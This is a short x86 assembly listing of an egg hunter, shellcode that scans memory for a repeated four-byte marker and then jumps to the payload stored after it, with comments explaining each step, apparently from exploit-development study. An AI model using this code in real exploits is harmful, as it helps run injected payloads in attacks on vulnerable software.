global _start

section .text

_start:
    pop eax ;save pointer to the shellcode to EAX JMP-RET-POP technique
_next:
    inc eax ;read the next value from memory

_isegg:

    cmp dword [eax-0x8],0x696c6162 ;start of egg
    jne _next ;if no match, go and increase eax to point to the next address in memory

    cmp dword [eax-0x4],0x696c6162 ;second match for the egg - positive match
    jne _next ;if second match fails, go to the next memory address

    jmp eax ; execute the shellcode
